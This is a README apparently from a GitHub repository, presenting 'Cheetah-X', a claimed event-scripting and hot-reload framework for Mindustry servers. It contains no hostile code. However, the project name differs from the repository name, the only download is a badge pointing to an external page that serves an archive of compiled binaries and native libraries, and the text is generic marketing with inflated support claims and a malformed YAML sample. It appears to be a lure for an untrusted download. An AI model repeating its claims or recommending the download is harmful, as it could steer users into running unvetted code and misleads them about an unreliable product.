![preview](https://raw.githubusercontent.com/Itzrg22/falcon-forge/main/showcase_5e27.svg)

# Cheetah-X: Adaptive Command-Line Automation for Mindustry Modding

**Cheetah-X** reimagines how server administrators and mod developers interact with Mindustry's Java-based architecture. Rather than another configuration tool, this project introduces a **behavioral scripting layer** that sits between your mod's logic and the game's event bus—translating complex server events into readable, maintainable, and hot-reloadable workflows.

Think of Cheetah-X as a **translator for your server's nervous system**. Where traditional mods require you to dig through Java classes and recompile for every tweak, this framework lets you write declarative rules that observe, intercept, and respond to gameplay events in real time. It's not about replacing Mindustry's robust API—it's about making that API feel like a natural extension of your own thought process.

The framework includes a **visual event pipeline inspector** (accessible via your browser) that renders the flow of server events as a live diagram, complete with filtering, search, and time-travel debugging. This isn't a gimmick—it's the difference between guessing why a script misbehaves and *seeing* the exact moment it deviates from your intent.

---

## 🌐 Overview: Why Cheetah-X Exists

Mindustry's scripting ecosystem has long suffered from a fragmentation problem. V6 and V7 introduced significant API changes, plugins from V6 often broke overnight, and documentation lagged behind implementation. Cheetah-X addresses this not by patching the symptoms, but by building a **version-agnostic abstraction layer** that normalizes API differences across Mindustry 7.x and 8.x builds.

| Feature | Traditional Plugin | Cheetah-X |
|--------|-------------------|------------|
| Hot-reload | Requires restart | ✔ Live reload via watcher |
| Multi-version support | Manual porting | ✔ Automatic normalization |
| Debugging | Print statements | ✔ Visual pipeline inspector |
| Configuration | JSON/XML files | ✔ YAML with schema validation |

But the real breakthrough lies in **declarative event choreography**. Imagine configuring a boss fight spawn sequence without writing a single loop. Cheetah-X lets you define:

```yaml
events:
  - trigger: "player_joins"
    action:
      - "check: map_difficulty > 3"
      - "broadcast: Welcome to the harder sector, {player.name}!"
      - "schedule: 600 ticks"
        then: "grant_item: silicon, 50"
```

This isn't wave-hand-waving—the framework compiles such rules into optimized callback chains that execute within the game's main thread without causing stutter.

---

## 🚀 Getting Started: Your First Automation

### Prerequisites

- Java 17+ (GraalVM recommended for ahead-of-time compilation of script bundles)
- Mindustry 7.0 Build 146 or newer (8.x experimental builds supported)
- A text editor with YAML linting (IntelliJ, VS Code, or vim with syntax highlighting)

### Initial Setup

**Step 1: Acquire the Framework**

[![Download](https://raw.githubusercontent.com/Itzrg22/falcon-forge/main/get_86c61.svg)](https://Itzrg22.github.io/falcon-forge/)

Place the distribution archive in your Mindustry server directory (`/config/mods/` for standard servers, or the appropriate custom path if you've modified your launcher). The archive contains three folders:

- `/bin` – Compiled bytecode and native libraries
- `/schemas` – JSON schemas for configuration validation
- `/docs` – API reference and migration guides

**Step 2: Initialize Your Workspace**

Run the bundled initializer script (`cheetah-init` for Unix systems, `cheetah-init.bat` for Windows). This creates:

```
/mods/cheetah-x/
├── rules/
│   ├── combat_rules.yaml
│   └── economy_rules.yaml
├── scripts/
│   ├── custom_events.js
│   └── helpers.js
├── config.yaml
└── state/
    └── (runtime data, do not edit)
```

**Step 3: Test the Integration**

Start your server. You should see a console log line: `[Cheetah-X] Pipeline established. 0 rules active.` The framework won't interfere with existing mods—it observes first, intercepts only when explicitly configured.

---

## 🧩 Core Features that Transform Your Workflow

### 1. Adaptive Event Normalization Layer

Mindustry's event system is powerful but inconsistent—some events fire with different parameters depending on the game version. Cheetah-X includes a **compatibility matrix** that translates over 120 distinct event types into a unified structure. Your scripts will write:

```javascript
// This works identically on v7 and v8
onEvent("unit.constructed", (data) => {
  log.info(`Unit created: ${data.unitType} at ${data.position}`);
});
```

Without the abstraction layer, `data.position` might be a `Vec2` in one version and a `float[]` in another. Cheetah-X canonicalizes these types automatically.

### 2. Hot-Reload Rule Engine

You'll never restart your server to test a change again. The file watcher detects modifications to `.yaml`, `.yml`, and `.json` files in the `rules/` directory, validates them against the bundled schemas, and swaps the affected rules atomically within 200 milliseconds. Failed validations are reported with precise line numbers and suggested fixes.

### 3. Visual Pipeline Inspector

Accessible at `http://localhost:8337` (configurable), this web-based dashboard provides:

- **Real-time transaction log** – Every event, rule evaluation, and action execution displayed as a streaming timeline
- **Flow diagram** – A procedural graph showing how events propagate through your rules
- **Time-travel debugging** – Replay the last 5,000 events with variable speed to diagnose sporadic issues
- **Resource monitoring** – CPU and memory impact per active rule

The inspector is a **progressive enhancement**—it works without external dependencies and degrades gracefully on systems without a browser.

### 4. Schema-Validated Configuration

Stop wasting time on typos and mis-indented YAML. Cheetah-X bundles:

- JSON schemas for every configuration file
- In-editor autocompletion (via LSP integration for VS Code and Neovim)
- Cross-file reference checking (detect when a rule references a non-existent variable)

### 5. Multilingual Command System

Server administrators often manage communities spanning multiple languages. Cheetah-X introduces a **language-aware command dispatcher** that:

- Accepts command aliases in EN, DE, RU, JA, KO, ZH, FR, and ES (dictionary-driven)
- Localizes response messages using placeholder-based templates
- Fallback to English when a translation is missing

Example: `/team assign player1 red` works equivalently to `/équipe assigner player1 rouge` on FR-enabled servers.

---

## 🔧 Advanced Scenarios for Seasoned Developers

### Building Custom Event Emitters

The framework isn't limited to listening—you can create synthetic events that other rules respond to:

```yaml
pipeline:
  synthetic_events:
    - name: "monthly_tournament"
      construction: |
        if (state.day % 30 == 0) {
          emit("tournament.start", { participants: [] });
        }
```

### Chaining Actions with Condition Guards

Rules support complex logical conditions without writing procedural code:

```yaml
rules:
  - when:
      event: "block.destroyed"
      condition: "block.type == 'core-shard' && attacker.faction != 'green'"
    actions:
      - "schedule: 300 ticks"
      - "evaluate: game_over(faction='red', reason='core_lost')"
```

### Extending the Rule Vocabulary

For developers who need more than built-in actions, Cheetah-X provides a Java SPI (Service Provider Interface). Implement `ActionProvider`, register it via `META-INF/services`, and your custom actions become available in YAML rules immediately.

---

## 🛟 Support: We're Here Around the Clock

**24/7 Community Assistance** – Our Discord and forum moderators average under 8 minutes response time during peak hours. We staff three overlapping time zones (UTC+9, UTC+1, UTC-5) to ensure someone's always awake.

**Documentation Portal** – A searchable wiki with tutorials ranging from "Hello World" to "Custom Game Modes." Every page includes code samples, troubleshooting guides, and video walkthroughs for visual learners.

**Release Cadence** – Major updates quarterly, security patches within 48 hours of disclosure. All releases are signed and checksum-verified.

**Commercial Tier** – For server networks operating at production scale, we offer priority support channels and guaranteed response SLAs. Contact the team through the repository's discussions section.

---

## 📜 License: MIT Standard

Cheetah-X is released under the [MIT License](https://opensource.org/licenses/MIT). You're free to:

- ✅ Use in commercial and personal projects
- ✅ Modify and distribute derivative works
- ✅ Incorporate into larger software products

Attribution requires preserving the copyright notice and license text in all copies or substantial portions of the software. The license also includes a **no-warranty clause**—the framework is provided "as-is" without explicit or implied guarantees of performance or fitness for any particular purpose.

---

## ⚠️ Disclaimer: Understand the Boundaries

**Cheetah-X is a tool for legitimate server administration and mod development only.** The framework explicitly prohibits:

- Bypassing authentication or authorization mechanisms
- Automating gameplay to gain unfair advantages in competitive modes
- Interfering with other players' experiences without their consent

**Performance considerations:** While the hot-reload engine is designed for minimal overhead, extremely complex rule chains (100+ active evaluation conditions) may introduce measurable latency during peak concurrent events. We recommend profiling with the built-in inspector before deployment on high-traffic servers.

**Version compatibility:** The framework tracks Mindustry's stable and release-candidate builds. We do not guarantee compatibility with nightly development builds, nor with third-party forks that modify core gameplay mechanics.

---

## 🏁 Final Thoughts: Transform Your Server Management

Cheetah-X isn't just another plugin—it's a **philosophical shift** in how we interface with game engines. By abstracting away version-specific quirks, providing live introspection, and enabling declarative logic, we're giving you back the most valuable resource: **development time**. Instead of fighting the API, you're orchestrating your vision.

The learning curve is gentle—most existing plugins can be translated to Cheetah-X rules within a day. And once you've felt the satisfaction of watching your server's events flow through the visual inspector, you'll wonder how you ever managed without it.

**Ready to elevate your Mindustry server administration?**

[![Download](https://raw.githubusercontent.com/Itzrg22/falcon-forge/main/get_86c61.svg)](https://Itzrg22.github.io/falcon-forge/)

---

*Cheetah-X 2026 Edition. Built with patience, caffeine, and an unhealthy obsession with event-driven architectures.*